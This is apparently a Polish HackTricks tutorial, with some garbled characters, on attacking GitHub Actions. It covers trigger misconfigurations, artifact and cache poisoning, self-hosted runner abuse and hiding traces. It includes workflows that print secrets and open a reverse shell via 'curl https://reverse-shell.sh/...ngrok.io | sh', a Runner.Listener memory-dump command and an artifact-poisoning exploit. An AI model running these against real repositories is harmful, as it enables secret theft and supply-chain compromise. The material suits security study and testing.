# Nadu偶ywanie Github Actions

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Podstawowe informacje

Na tej stronie znajdziesz:

* **Podsumowanie wszystkich skutk贸w** uzyskania dostpu do Github Action przez atakujcego
* R贸偶ne sposoby **uzyskania dostpu do akcji**:
* Posiadanie **uprawnie** do tworzenia akcji
* Nadu偶ywanie wyzwalaczy zwizanych z **pull requestami**
* Nadu偶ywanie **innych technik zewntrznego dostpu**
* **Pivotowanie** z ju偶 skompromitowanego repozytorium
* Na koniec, sekcja dotyczca **technik poeksploatacyjnych do nadu偶ywania akcji od wewntrz** (spowodowanie wspomnianych skutk贸w)

## Podsumowanie skutk贸w

Wprowadzenie do [**Github Actions znajdziesz w podstawowych informacjach**](../basic-github-information.md#github-actions).

W przypadku, gdy mo偶esz **wykonywa dowolne akcje Github/iniekcj kodu** w **repozytorium**, mo偶esz mie mo偶liwo:

* **Kra** **sekrety** z tego repozytorium/organizacji.
* Jeli mo偶esz tylko wstrzykiwa, mo偶esz kra to, co ju偶 jest obecne w przepywie pracy.
* Nadu偶ywa **uprawnie repozytorium** do dostpu do innych platform, takich jak AWS i GCP.
* **Wykonywa kod w niestandardowych pracownikach** (jeli s u偶ywane niestandardowe pracowniki) i pr贸bowa pivotowa stamtd.
* **Nadpisywa** kod **repozytorium**.
* To zale偶y od uprawnie `GITHUB_TOKEN` (jeli takie istniej).
* **Kompromitowa** **wdro偶enia** i inne **artefakty**.
* Jeli kod jest wdra偶any lub przechowywany, mo偶esz go zmodyfikowa i uzyska dalszy dostp.

## GITHUB\_TOKEN

Ten "**sekret**" (pochodzcy z `${{ secrets.GITHUB_TOKEN }}` i `${{ github.token }}`) jest udzielany, gdy administrator wcza t opcj:

<figure><img src="../../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

Ten token jest taki sam, jakiego u偶ywa **Aplikacja Github**, wic mo偶e uzyska dostp do tych samych punkt贸w kocowych: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Github powinien udostpni [**przepyw**](https://github.com/github/roadmap/issues/74), kt贸ry **umo偶liwia dostp midzyrepozytorialny** w GitHub, dziki czemu repozytorium mo偶e uzyska dostp do innych wewntrznych repozytori贸w za pomoc `GITHUB_TOKEN`.
{% endhint %}

Mo偶esz zobaczy mo偶liwe **uprawnienia** tego tokenu pod adresem: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

Nale偶y zauwa偶y, 偶e token **wygasa po zakoczeniu zadania**.\
Te tokeny wygldaj tak: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Niekt贸re interesujce rzeczy, kt贸re mo偶esz zrobi za pomoc tego tokenu:

{% tabs %}
{% tab title="Scal PR" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% tab title="Zatwierd藕 PR" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="Utw贸rz PR" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
Zauwa偶, 偶e w wielu przypadkach bdziesz w stanie znale藕 **tokeny u偶ytkownika Github w zmiennych rodowiskowych Github Actions lub w sekretach**. Te tokeny mog da Ci wiksze uprawnienia w repozytorium i organizacji.
{% endhint %}

<details>

<summary>Wywietl list sekret贸w w wynikach Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Uzyskaj odwr贸con powok z sekretami</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

Mo偶liwe jest sprawdzenie uprawnie udzielonych tokenowi Github w repozytoriach innych u偶ytkownik贸w **sprawdzajc logi** akcji:

<figure><img src="../../../.gitbook/assets/image (97).png" alt="" width="269"><figcaption></figcaption></figure>

## Dozwolone wykonanie

{% hint style="info" %}
To byoby najatwiejsze sposobem na kompromitacj akcji Github, poniewa偶 w tym przypadku zakada si, 偶e masz dostp do **tworzenia nowego repozytorium w organizacji** lub masz **uprawnienia do zapisu w repozytorium**.

Jeli jeste w tej sytuacji, mo偶esz po prostu sprawdzi [techniki eksploatacji po](./#techniki-eksploatacji-po-wewntrz-akcji).
{% endhint %}

### Wykonanie z tworzenia repozytorium

W przypadku, gdy czonkowie organizacji mog **tworzy nowe repozytoria** i mo偶esz wykonywa akcje github, mo偶esz **utworzy nowe repozytorium i ukra tajemnice ustawione na poziomie organizacji**.

### Wykonanie z nowej gazi

Jeli mo偶esz **utworzy now ga藕 w repozytorium, kt贸re ju偶 zawiera skonfigurowan akcj Github**, mo偶esz j **zmodyfikowa**, **przesa** zawarto, a nastpnie **wykona t akcj z nowej gazi**. W ten spos贸b mo偶esz **wycieka tajemnice na poziomie repozytorium i organizacji** (ale musisz wiedzie, jak si nazywaj).

Mo偶esz sprawi, 偶e zmodyfikowana akcja bdzie wykonywalna **rcznie**, gdy **utworzony zostanie PR** lub gdy **kod zostanie przesany** (w zale偶noci od tego, jak haaliwy chcesz by):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
***

## Wykonanie przez rozgazienie

{% hint style="info" %}
Istniej r贸偶ne wyzwalacze, kt贸re mog umo偶liwi atakujcemu **wykonanie Github Action z innego repozytorium**. Jeli te akcje wyzwalajce s 藕le skonfigurowane, atakujcy mo偶e je skompromitowa.
{% endhint %}

### `pull_request`

Wyzwalacz workflow **`pull_request`** uruchamia workflow za ka偶dym razem, gdy otrzymuje 偶danie pull requestu, z pewnymi wyjtkami: domylnie, jeli jest to **pierwszy raz**, gdy **wsp贸pracujesz**, jaki **opiekun** musi **zaakceptowa** **uruchomienie** workflow:

<figure><img src="../../../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Poniewa偶 **domylne ograniczenie** dotyczy **nowych wsp贸pracownik贸w**, mo偶esz przyczyni si do **naprawy wa偶nego bdu/ortografii** i nastpnie wysa **inne PR-y, aby wykorzysta nowe uprawnienia `pull_request`**.

**Przetestowaem to i nie dziaa**: ~~Inn opcj byoby utworzenie konta o nazwie osoby, kt贸ra przyczynia si do projektu i usunia swoje konto.~~
{% endhint %}

Ponadto, domylnie **uniemo偶liwia dostp do zapisu** i **dostp do sekret贸w** w repozytorium docelowym, jak wspomniano w [**dokumentacji**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories):

> Z wyjtkiem `GITHUB_TOKEN`, **sekrety nie s przekazywane do wykonawcy** podczas uruchamiania workflow z **rozgazionego** repozytorium. **`GITHUB_TOKEN` ma uprawnienia tylko do odczytu** w 偶daniach pull request贸w **z rozgazionych repozytori贸w**.

Atakujcy mo偶e zmodyfikowa definicj Github Action w celu wykonania dowolnych czynnoci i doczenia dowolnych akcji. Jednak nie bdzie m贸g kra sekret贸w ani nadpisywa repozytorium ze wzgldu na wspomniane ograniczenia.

{% hint style="danger" %}
**Tak, jeli atakujcy zmieni w PR akcj Github, kt贸ra zostanie wywoana, jego Github Action zostanie u偶yta, a nie ta z repozytorium 藕r贸dowego!**
{% endhint %}

Poniewa偶 atakujcy kontroluje r贸wnie偶 kod, kt贸ry jest wykonywany, nawet jeli nie ma sekret贸w ani uprawnie do zapisu w `GITHUB_TOKEN`, atakujcy mo偶e na przykad **przesya zoliwe artefakty**.

### **`pull_request_target`**

Wyzwalacz workflow **`pull_request_target`** ma **uprawnienia do zapisu** w repozytorium docelowym i **dostp do sekret贸w** (i nie wymaga zgody).

Nale偶y zauwa偶y, 偶e wyzwalacz workflow **`pull_request_target`** **uruchamia si w kontekcie bazowym** i nie w kontekcie PR (aby **nie wykonywa niezaufanego kodu**). Aby uzyska wicej informacji na temat `pull_request_target`, [**sprawd藕 dokumentacj**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target).\
Ponadto, aby uzyska wicej informacji na temat tego konkretnego niebezpiecznego u偶ycia, sprawd藕 ten [**wpis na blogu Githuba**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

Mo偶e si wydawa, 偶e poniewa偶 **wykonywane workflow** jest zdefiniowane w **bazowym** repozytorium, a nie w PR, u偶ywanie **`pull_request_target`** jest **bezpieczne**, ale istniej **kilka przypadk贸w, w kt贸rych nie jest**.

A ten bdzie **mia dostp do sekret贸w**.

### `workflow_run`

Wyzwalacz [**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run) umo偶liwia uruchomienie workflow z innego workflow, gdy jest `completed`, `requested` lub `in_progress`.

W tym przykadzie workflow jest skonfigurowane do uruchomienia po zakoczeniu oddzielnego workflow "Run Tests":
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Ponadto, zgodnie z dokumentacj: Workflow rozpoczty przez zdarzenie `workflow_run` ma mo偶liwo **dostpu do sekret贸w i zapisywania token贸w, nawet jeli poprzedni workflow tego nie robi**.

Tego rodzaju workflow mo偶e by atakowany, jeli **zale偶y** on od workflow, kt贸ry mo偶e by **uruchomiony** przez zewntrznego u偶ytkownika za pomoc **`pull_request`** lub **`pull_request_target`**. Kilka przykad贸w podatnych na ataki mo偶na znale藕 w [**tym blogu**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** Pierwszy z nich polega na pobraniu kodu atakujcego przez workflow uruchomiony za pomoc **`workflow_run`**: `${{ github.event.pull_request.head.sha }}`\
Drugi polega na **przekazaniu** artefaktu z niezaufanego kodu do workflow **`workflow_run`** i wykorzystaniu zawartoci tego artefaktu w spos贸b, kt贸ry czyni go podatnym na RCE.

### `workflow_call`

TODO

TODO: Sprawd藕, czy wykonujc z `pull\_request`, u偶ywany/pobierany kod to kod z oryginau czy z rozgazionej PR

## Wykorzystywanie wykonania z rozgazienia

Wymienilimy wszystkie sposoby, w jakie zewntrzny atakujcy m贸gby spowodowa wykonanie workflow w Githubie, teraz przyjrzyjmy si, jak to wykonanie, jeli jest 藕le skonfigurowane, mo偶e by wykorzystane:

### Wykonanie niezaufanego pobrania

W przypadku **`pull_request`**, workflow zostanie wykonane w **kontekcie PR** (czyli zostanie wykonany **zoliwy kod PR**), ale kto musi go **autoryzowa** i zostanie uruchomiony z pewnymi [ograniczeniami](./#pull\_request).

W przypadku workflow korzystajcego z **`pull_request_target` lub `workflow_run`**, kt贸ry zale偶y od workflow, kt贸re mo偶e by uruchomione z **`pull_request_target` lub `pull_request`**, zostanie wykonany kod z oryginalnego repozytorium, wic **atakujcy nie mo偶e kontrolowa wykonanego kodu**.

{% hint style="danger" %}
Jednak jeli **akcja** ma **wyra藕ne pobranie PR**, kt贸re **pobierze kod z PR** (a nie z bazy), zostanie u偶yty kod kontrolowany przez atakujcego. Na przykad (sprawd藕 lini 12, gdzie pobierany jest kod PR):
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># NIEBEZPIECZNE. Przykad tylko w celach demonstracyjnych.
on:
pull_request_target

jobs:
build:
name: Budowanie i testowanie
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Dzikuj!
</code></pre>

Potencjalnie **niezaufany kod jest uruchamiany podczas `npm install` lub `npm build`**, poniewa偶 skrypty budowania i u偶ywane **pakiety s kontrolowane przez autora PR**.

{% hint style="warning" %}
Dork Githuba do wyszukiwania podatnych akcji to: `event.pull_request pull_request_target extension:yml`, jednak istnieje wiele r贸偶nych sposob贸w konfiguracji zada, kt贸re mo偶na wykona w spos贸b bezpieczny, nawet jeli akcja jest skonfigurowana w spos贸b niebezpieczny (np. u偶ywajc warunk贸w dotyczcych tego, kto jest aktorem generujcym PR).
{% endhint %}

### Wstrzykiwanie skrypt贸w kontekstowych <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Nale偶y zauwa偶y, 偶e istniej pewne [**konteksty Githuba**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context), kt贸rych wartoci s **kontrolowane** przez **u偶ytkownika** tworzcego PR. Jeli akcja Githuba u偶ywa tych danych do wykonania czegokolwiek, mo偶e to prowadzi do **wykonania dowolnego kodu:**

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **Wstrzykiwanie skrypt贸w do GITHUB\_ENV** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

Z dokumentacji: Mo偶esz udostpni **zmienne rodowiskowe** dla kolejnych krok贸w w zadaniu workflow, definiujc lub aktualizujc zmienn rodowiskow i zapisujc j w pliku rodowiskowym **`GITHUB_ENV`**.

Jeli atakujcy m贸gby **wstrzykn dowoln warto** do tej zmiennej **env**, m贸gby wstrzykn zmienne rodowiskowe, kt贸re mogyby wykonywa kod w kolejnych krokach, takich jak **LD\_PRELOAD** lub **NODE\_OPTIONS**.

Na przykad ([**ten**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) i [**ten**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), wyobra藕 sobie workflow, kt贸re polega na zaufaniu do przesanego artefaktu, aby przechowa jego zawarto w zmiennej rodowiskowej **`GITHUB_ENV`**. Atakujcy m贸gby przesa co takiego, aby go skompromitowa:

<figure><img src="../../../.gitbook/assets/image (3) (2).png" alt=""><figcaption></figcaption></figure>

### Podatne akcje Githuba stron trzecich

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

Jak wspomniano w [**tym wpisie na blogu**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), ta akcja Githuba umo偶liwia dostp do artefakt贸w z r贸偶nych workflow i nawet repozytori贸w.

Problem polega na tym, 偶e jeli parametr **`path`** nie jest ustawiony, artefakt jest rozpakowywany w bie偶cym katalogu i mo偶e nadpisa pliki, kt贸re mog by p贸藕niej u偶ywane lub nawet wykonywane w workflow. Dlatego, jeli Artefakt jest podatny, atakujcy mo偶e wykorzysta to do skompromitowania innych workflow, kt贸re ufay Artefaktowi.

Przykad podatnego workflow:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
To mo偶e zosta zaatakowane za pomoc tego workflow:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
***

## Inne zewntrzne dostpy

### Przechwytywanie usunitego repozytorium przestrzeni nazw

Jeli konto zmieni swoj nazw, inny u偶ytkownik mo偶e zarejestrowa konto o tej samej nazwie po pewnym czasie. Jeli repozytorium miao **mniej ni偶 100 gwiazdek przed zmian nazwy**, Github pozwoli nowo zarejestrowanemu u偶ytkownikowi o tej samej nazwie utworzy **repozytorium o tej samej nazwie** jak usunite.

{% hint style="danger" %}
Jeli dziaanie korzysta z repozytorium nieistniejcego konta, nadal istnieje mo偶liwo, 偶e atakujcy mo偶e utworzy to konto i naruszy dziaanie.
{% endhint %}

Jeli inne repozytoria korzystaj z **zale偶noci z repozytori贸w tego u偶ytkownika**, atakujcy bdzie w stanie przej je. Tutaj znajduje si bardziej szczeg贸owe wyjanienie: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## Prowadzenie repozytorium

{% hint style="info" %}
W tej sekcji om贸wimy techniki, kt贸re umo偶liwi **przejcie z jednego repozytorium do innego**, zakadajc, 偶e mamy pewien rodzaj dostpu do pierwszego (sprawd藕 poprzedni sekcj).
{% endhint %}

### Zatrucie pamici podrcznej

Pami podrczna jest utrzymywana midzy **uruchomieniami przepywu pracy w tej samej gazi**. Oznacza to, 偶e jeli atakujcy **naruszy** **pakiet**, kt贸ry jest nastpnie przechowywany w pamici podrcznej i **pobrany** oraz wykonany przez **bardziej uprzywilejowany** przepyw pracy, bdzie w stanie r贸wnie偶 **naruszy** ten przepyw pracy.

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### Zatrucie artefakt贸w

Przepywy pracy mog korzysta z **artefakt贸w z innych przepyw贸w pracy i nawet repozytori贸w**, jeli atakujcy zdoa **naruszy** dziaanie Github, kt贸re **przesya artefakt**, kt贸ry jest p贸藕niej u偶ywany przez inny przepyw pracy, mo偶e **naruszy inne przepywy pracy**:

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## Po wykorzystaniu z dziaania

### Dostp do AWS i GCP za pomoc OIDC

Sprawd藕 nastpujce strony:

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### Dostp do sekret贸w <a href="#accessing-secrets" id="accessing-secrets"></a>

Jeli wstrzykujesz zawarto do skryptu, warto wiedzie, jak uzyska dostp do sekret贸w:

* Jeli tajemnica lub token jest ustawiony jako **zmienna rodowiskowa**, mo偶na go bezporednio uzyska, korzystajc z **`printenv`**.

<details>

<summary>Wywietlanie sekret贸w w wynikach dziaania Github</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Uzyskaj odwr贸con powok z sekretami</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

* Jeli sekret jest u偶ywany **bezporednio w wyra偶eniu**, wygenerowany skrypt powoki jest przechowywany **na dysku** i jest dostpny.
* ```bash
cat /home/runner/work/_temp/*
```
* Dla akcji JavaScript sekrety s przesyane za pomoc zmiennych rodowiskowych
* ```bash
ps axe | grep node
```
*   Dla **niestandardowej akcji**, ryzyko mo偶e si r贸偶ni w zale偶noci od tego, jak program wykorzystuje uzyskany z **argumentu** sekret:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Nadu偶ywanie wasnych runner贸w

Sposobem na znalezienie **Akcji Github wykonywanych w infrastrukturze spoza Githuba** jest wyszukiwanie **`runs-on: self-hosted`** w konfiguracji yaml Akcji Github.

**Wasne** runnery mog mie dostp do **bardziej wra偶liwych informacji**, do innych **system贸w sieciowych** (podatne punkty kocowe w sieci? usuga metadanych?) lub, nawet jeli jest izolowany i zniszczony, **mo偶e by uruchomionych wicej ni偶 jedna akcja naraz** i zoliwa akcja mo偶e **ukra sekrety** innej akcji.

W wasnych runnerach mo偶liwe jest r贸wnie偶 uzyskanie **sekret贸w z procesu **_**Runner.Listener**_**, kt贸ry bdzie zawiera wszystkie sekrety workflow w dowolnym kroku poprzez zrzucenie jego pamici:

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

Sprawd藕 [**ten post dla wicej informacji**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Rejestr obraz贸w Docker w Github

Mo偶liwe jest tworzenie akcji Github, kt贸re bd **budowa i przechowywa obraz Docker wewntrz Github**.\
Przykad mo偶na znale藕 w poni偶szym rozwijanym bloku:

<details>

<summary>Akcja Github - Budowanie i Wysyanie Obrazu Docker</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Jak mo偶na zauwa偶y w poprzednim kodzie, rejestr Github jest hostowany na **`ghcr.io`**.

U偶ytkownik posiadajcy uprawnienia do odczytu repozytorium bdzie w stanie pobra obraz Dockerowy przy u偶yciu tokena dostpu osobistego:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Nastpnie u偶ytkownik mo偶e szuka **wyciekych sekret贸w w warstwach obrazu Docker:**

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

### Wra偶liwe informacje w dziennikach Github Actions

Nawet jeli **Github** pr贸buje **wykrywa wartoci sekretne** w dziennikach dziaa i **unika ich wywietlania**, **inne wra偶liwe dane**, kt贸re mogy zosta wygenerowane podczas wykonywania dziaania, nie zostan ukryte. Na przykad JWT podpisany za pomoc wartoci sekretnej nie zostanie ukryty, chyba 偶e jest to [specjalnie skonfigurowane](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## Zakrywanie lad贸w

(Technika z [**tutaj**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Przede wszystkim, ka偶de podniesione PR jest widoczne publicznie w Github i na koncie docelowym w GitHub. W GitHub domylnie **nie mo偶emy usun PR z internetu**, ale jest pewien haczyk. Dla kont Github, kt贸re s **zawieszone** przez Github, wszystkie ich **PR s automatycznie usuwane** i usuwane z internetu. Aby ukry swoj aktywno, musisz albo **zawiesi swoje konto GitHub, albo oznaczy swoje konto**. Spowoduje to **ukrycie wszystkich twoich dziaa** na GitHub przed internetem (w zasadzie usunicie wszystkich twoich exploit PR)

Organizacja w GitHub jest bardzo aktywna w zgaszaniu kont do GitHub. Wystarczy udostpni "jakie rzeczy" w problemie, a oni upewni si, 偶e twoje konto zostanie zawieszone w cigu 12 godzin :p i oto masz, tw贸j exploit jest niewidoczny na github.

{% hint style="warning" %}
Jedynym sposobem dla organizacji, aby dowiedzie si, 偶e zostay zaatakowane, jest sprawdzenie dziennik贸w GitHub z SIEM, poniewa偶 z interfejsu GitHub PR zostanie usunite.
{% endhint %}

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi trikami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
